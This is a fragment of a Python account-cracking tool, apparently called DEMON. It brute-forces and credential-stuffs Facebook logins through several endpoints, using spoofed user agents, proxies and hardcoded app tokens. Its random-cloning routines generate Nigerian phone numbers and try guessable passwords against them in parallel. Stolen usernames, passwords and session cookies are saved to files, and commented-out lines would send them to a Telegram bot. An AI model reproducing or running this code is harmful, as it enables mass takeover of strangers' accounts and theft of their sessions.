ses.get(f"https://m.facebook.com/login/device-based/password/?uid="+uid+"&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr")
				data = {
				"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
				"uid": uid,
				"next": "https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=3618539641590455&cbt=1696752891275&e2e=%7B%22init%22%3A1696752891275%7D&ies=1&sdk=android-13.1.0&sso=chrome_custom_tab&nonce=26963441-e2bf-496f-97bf-2c6623861aed&scope=openid%2Cpublic_profile%2Cemail&state=%7B%220_auth_logger_id%22%3A%22e971aba2-6f14-44d0-98d3-44be37e9c6c8%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22plim8mlau0dci6b51tc1%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.netease.partyglobal&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=bZrS8Qf4YJl6Zmup0AMuKIP1g36luEnC6kIkQ3lDhqo&ret=login&fbapp_pres=0&logger_id=e971aba2-6f14-44d0-98d3-44be37e9c6c8&tp=unspecified",
				"flow": "login_no_pin",
				"encpass": f"#PWD_BROWSER:0:{str(TimeTegar()).split('.')[0]}:{pw}",
				}
				hider = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'en-GB;q=0.9,en-US;q=0.8,en;q=0.7'}
				po = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=en_GB",data=data,headers=hider,allow_redirects=False)
				response=parser(po.text, "html.parser")
				#rint(q)
				if "c_user" in ses.cookies.get_dict():
					####token = response["access_token"]
					cok = convert(ses.cookies.get_dict())
					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'\n')
					ok.append(uid)
					open('/sdcard/DEMON_M6_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/DEMON_M6_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif "checkpoint" in po.cookies.get_dict():
					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M6_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method6(uid,nm,pwx)
		except Exception as e:
			self.method6(uid,nm,pw)
	def method7(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M7 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			sam = random.choice(samsung)
			net = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG"])
			fbbv = str(random.randint(211111111,499999999))
			fbav = f'{random.randint(200,450)}.0.0.{random.randint(11,99)}.{random.randint(111,399)}'
			m9ua = "[FBAN/FB4A;FBAV/444.0.0.2662;FBBV/5231713;[FBAN/FB4A;FBAV/"+fbav+";FBBV/"+fbbv+";FBDM/{density=2.625,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/"+net+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-"+sam+";FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
			ua = random.choice([m9ua])
			ua = random.choice(ugen)
			ua = random.choice(ugen1)
			ua = random.choice(ugent)
			ua = iAmMethod1Ua()
			ua = iAmMethod3Ua()
			ua = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(100,118))}.0.0.0 Mobile Safari/537.36"
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			fn = nm.split(' ')[0]
			try:
				mn = nm.split(' ')[1]
				#if len(mn)<3:
			except:
				mn = fn
			try:
				ln = nm.split(' ')[2]
			except:
				ln = mn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('middle',mn.lower()).replace('Middle',mn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6x61hgt7%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D54d295be-cf69-4ed8-8993-fc2de92d0fe9%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6x61hgt7%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr')
				data = {
				'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
				'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
				'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
				'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
				'email': uid,
				'prefill_contact_point': uid,
				'prefill_source': 'browser_onload',
				'prefill_type': 'contact_point',
				'first_prefill_source': 'browser_dropdown',
				'first_prefill_type': 'contact_point',
				'had_cp_prefilled': 'true',
				'had_password_prefilled': 'false',
				'is_smart_lock': 'false',
				'bi_xrwh': '0',
				'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
				'fb_dtsg': '',
				'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
				'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
				'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
				'__csr': '',
				'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
				'__a': 'AYkKPcNtpFVbt0bGXCi5sSAV_t-uV-mU39BBtNtNeNCrN5wm5KeG7ipc69Rb3ZWfTsilwABDxkJBYiCtIqx6tA2bCcEkK5lTDtiB93oLS0MaDA',
				'__user':0
				}
				
				headers = {'Host': 'x.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVo7md-lvRU','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6x61hgt7%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D54d295be-cf69-4ed8-8993-fc2de92d0fe9%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6x61hgt7%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
				q = ses.post('https://m.facebook.com/login/device-based/login/assync/?api_key=1862952583919182&auth_token=06494ae0b3a161178084234ae7453ea3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2lf951yj%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf181ab0-57b8-41eb-a5fc-a9b60e705691%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2lf951yj%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&ht_token=Abs7V2PGLg6m8kfNZx6aae9oe643ep1bfI6gV-1mCTFoHCQ-&h_consent=1&ht_l=login&lwv=100',data=data,headers=headers,proxies=proxs)
				#rint(q)
				if "c_user" in ses.cookies.get_dict().keys():
					##token = q["access_token"]
					cok = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+'\n')
					ok.append(uid)
					open('/sdcard/DEMON_M7_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/DEMON_M7_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					#requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {cok}  )\n.√. By :- CYBER DEMON √ " )
					break
				elif "checkpoint" in q.cookies.get_dict().keys():
					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M7_CP.txt','a').write(uid+'|'+pw+'\n')
					#requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n ====================\n √. USER   (  {uid}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. . By :- CYBER DEMON √ " )
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method7(uid,nm,pwx)
		except Exception as e:
			self.method7(uid,nm,pw)
	def method8(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M8 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			ss = random.choice(["en_US","en_GB"])
			free = str(rr(1601,1999))
			andro = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,5))+'.'+str(random.randint(0,9)),'7','6','8.0.0','8.1.0','8','9','10','11','12','13'])
			ua1 = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(30,118))}.0.0.0 Mobile Safari/537.36"
			ua2 = f"Dalvik/2.1.0 (Linux; U; Android {andro}; vivo {free} [FBAN/MessengerLite;FBAV/{str(rr(100,437))}.0.0.{str(rr(3,9))}.{str(rr(50,250))};FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/616331435;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo "+f"{free} ;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+"{density=2.25,height=2048,width=2048"+"};]"
			ua = random.choice(ugent)
			ua = ugen()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				headers = {
				"Host": "graph.facebook.com",
				"x-fb-connection-bandwidth":str(random.randint(20000000,30000000)),
				"x-fb-sim-hni":str(random.randint(20000,40000)),
				"x-fb-net-hni":str(random.randint(20000,40000)),
				"x-fb-connection-quality":"EXCELLENT",
				"user-agent":ua,
				"content-type":"application/x-www-form-urlencoded",
				"x-fb-http-engine":"Liger"
				}
				params = {
				"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
				"sdk_version": str(random.randint(1,30)),
				"email": uid,
				"locale": "en_GB",
				"password": pw,
				"sdk": "android",
				"generate_session_cookies": "1",
				"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
				}
				response= ses.post("https://graph.facebook.com/auth/login",params=params,headers=headers,allow_redirects=False)
				#rint(q)
				if "session_key" in response.text and "EAA" in response.text:
					token = response.json()["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in response.json()["session_cookies"])
					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/DEMON_M8_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/DEMON_M8_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif "www.facebook.com" in response['error']['message']:
					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M8_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				elif "User must verify their account" in response.text:
					p('\r\033[1;91m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M8_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method8(uid,nm,pwx)
		except Exception as e:
			self.method8(uid,nm,pw)
			
######RANDOM CLONE###
def Main_Menu(self):
    clear()
    print(f'{W} [{R}1{W}] {W} NIGERIA CLONING [NEW IDS]\n{W} [{R}2{W}] {W} NIGERIA CLONING [OLD ID]\n{W} [{R}0{W}] {W}BACK MENU')
    #os.system('espeak -a 300 " Random,  Cloning, Menu,"')
    line()
    option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
    if option in ['1','01']:
        nig()
    if option in ['2','02']:
        nig2()
    if option in ['3','03']:
        afg()
    if option in ['4','04']:
        ind()
    if option in ['0','00']:
    	DEMON.DEMON()
    else:
    	line()
    print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
    time.sleep(2)
    Main_Menu(self)
#####____Random-Method-Setup____#####
def nig():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 080,081,070,090,091')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ranag1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,ids[:8],ids[:7],ids[:6],ids[:5],ids[:4],'123456','12345678','1234567',ids[8:],ids[7:],ids[6:],ids[5:]]
                                ranag1.submit(rd,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                Main_Menu(self)
def nig2():
                user=[]
                clear()
                print(f'{W} [{R}+{W}] {W}EXAMPLE CODE EXAMPLE : 080,081,070,090,091')
                code = input(f'{W} [{R}+{W}] {W}PUT CODE: ')
                clear()
                try:
                        limit = int(input(f'{W} [{R}+{W}] {W}EXAMPLE : 2000, 3000, 5000, 10000\n{W} [{R}+{W}] {W}PUT LIMIT : '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as ranag1:     
                        clear()
                        
                        tl = str(len(user))
                        print(f'{W} [{R}+{W}] {W}TOTAL ACCOUNT: {W}'+tl)
                        print(f'{W} [{R}+{W}] {W}SELECT CODE: {W} '+code)
                        print(f'{W} [{R}+{W}] {W}CRACKING.... {W}')
                        line()
                        for psx in user:
                                ids = code+psx
                                passlist=[psx,ids,ids[:8],ids[:7],ids[:6],ids[:5],ids[:4],'123456','12345678','1234567',ids[8:],ids[7:],ids[6:],ids[5:]]
                                ranag1.submit(rd1,ids,passlist)
                print(f'\033[1;37m')
                line()
                print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
                print(f'{W} [{R}+{W}] {W}TOTAL OK/CP: '+str(len(ok))+'/'+str(len(cp)))
                line()
                input(f'{W} [{R}+{W}] {W}PRESS ENTER TO BACK ')
                Main_Menu(self)
          
                
def rd(uid,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r{W} [{R} DEMON {W}]%s|{R} RNDM{W}|\033[1;32mOK:%s\033[1;37m|{R}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
		ua = random.choice(ugen)
		for pas in passlist:
			data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'secure_family_device_id': str(uuid.uuid4()),
'cpl': 'true',
'try_num': '1',
'email': uid,
'password': pas,
'method': 'auth.login',
'generate_session_cookies': '1',
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_emails': "['01710940017']",
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'error_detail_type': 'button_with_disabled',
'source': 'account_recovery',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate',
'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
			head = {'Host': 'graph.facebook.com',
'Content-Type': 'application/x-www-form-urlencoded',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Priority': 'u=3, i',
'X-Fb-Sim-Hni': '45204',
'X-Fb-Net-Hni': '45201',
'X-Fb-Connection-Quality': 'GOOD',
'Zero-Rated': '0',
'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Bandwidth': '24807555',
'X-Fb-Connection-Type': 'MOBILE.LTE',
'X-Fb-Device-Group': '5120',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
'Content-Length': '847'}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if 'session_key' in po:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [DEMON-OK] '+uid+' | '+pas+'\033[1;37m')
				#os.system('espeak -a 300 " Congratulation,   Dear,  ,User,"')
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				RANA1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={RANA1};{ckkk}"
				print(f'\r\033[1;32m [COOKIES] :{W} '+cookie)
				open('/sdcard/DEMON/DEMON-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r{W} [DEMON-CP] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/DEMON/DEMON-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleeprint(20)
	except Exception as e:
		pass
			
			
def rd1(uid,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write(f'\r\r{W} [{R} DEMON{W}]%s|{R} RNDM{W}|\033[1;32mOK:%s\033[1;37m|{R}CP:%s\033[1;37m'%(loop,len(ok),len(cp)));sys.stdout.flush()
		for pas in passlist:
			ua = random.choice(ugent)
			params={
			"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
			"sdk_version":{random.randint(1,26)},
			"email":uid,
			"locale":"en_US",
			"password":pas,
			"sdk":"android",
			"generate_session_cookies":"1",
			"sig":"4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers={
			"Host":"graph.facebook.com",
			"x-fb-connection-bandwidth":str(random.randint(20000000,30000000)),
			"x-fb-sim-hni":str(random.randint(20000,40000)),
			"x-fb-net-hni":str(random.randint(20000,40000)),
			"x-fb-connection-quality":"EXCELLENT",
			"user-agent":ua,
			"content-type":"application/x-www-form-urlencoded",
			"x-fb-http-engine":"Liger"
			}
			po = ses.post("https://graph.facebook.com/auth/login",params=params,headers=headers,allow_redirects=False)
			if 'session_key' in po.text or "EAA" in po.text:
				uid = str(po['uid'])
				print(f'\r\033[1;32m [DEMON-OK] '+uid+' | '+pas+'\033[1;37m')
				#os.system('espeak -a 300 " Congratulation,   Dear,  ,User,"')
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				DEM1 = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DEM1};{ckkk}"
				print(f'\r\033[1;32m [COOKIES] :{W} '+cookie)
				open('/sdcard/DEMON/DEMON-RNDM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
				ok.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r{W} [DEMON-CP] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/DEMON/DEMON-RNDM-CP.txt','a').write(uid+'|'+pas+'\n')
				cp.append(uid)
				break
			else:
				continue
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleeprint(20)
	except Exception as e:
		pass
			
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))
			
class Join:
	def __init_(self):
		logo()
		os.system("xdg-open https://wa.me/+2348178406817")
	def Whatsapp(self):
		os.system("xdg-open https://chat.whatsapp.com/D3Xd6IztOyi9Jg53G98Cjx")
		DEMON().DEMON()
	def Facebook(self):
		os.system('xdg-open https://www.facebook.com/100053053007337/posts/1058020211826543/?substory_index=1058020211826543&app=fbl')
		DEMON().DEMON()

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
		file = input(" [✓] File Path :- ")
		try:
			open(file,'r').read()
			print("   [✓]   Example  /sdcard/file1.txt  ")
			out = input("  [=] Save Path :- ")
			os.system('touch '+out)
			os.system('sort -r '+file+' | uniq > '+out)
			p("  [ All double links are Removed ] ")
			p(" [•] Your File Saved in %s "%(out))
